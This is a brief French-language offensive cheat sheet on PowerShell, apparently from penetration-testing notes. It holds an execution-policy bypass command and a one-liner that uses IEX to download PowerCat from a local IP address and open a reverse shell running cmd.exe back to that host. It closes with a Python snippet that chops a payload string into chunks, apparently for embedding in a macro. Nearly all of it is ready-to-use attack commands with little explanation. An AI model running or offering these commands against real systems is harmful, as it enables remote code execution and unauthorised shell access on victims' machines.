PowerShell est un langage de programmation orienté objet exécuté à partir du Dynamic Language Runtime (DLR) dans  `.NET`

Contournement des arguments

```sh
powershell -ex bypass -File exploit.ps1
```


```sh
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.128:8080/PowerCat.ps1');powercat -c 192.168.45.128 -p 4443 -e cmd.exe"
```

---
Fichier `split.py`

```python
str = "powershell ..."
n = 50
for i in range(0, len(str), 50):
	print "payload = payload + " + '"' + str[i:i+n] + '"'

# python split.py | xclip -selection clipboard
```

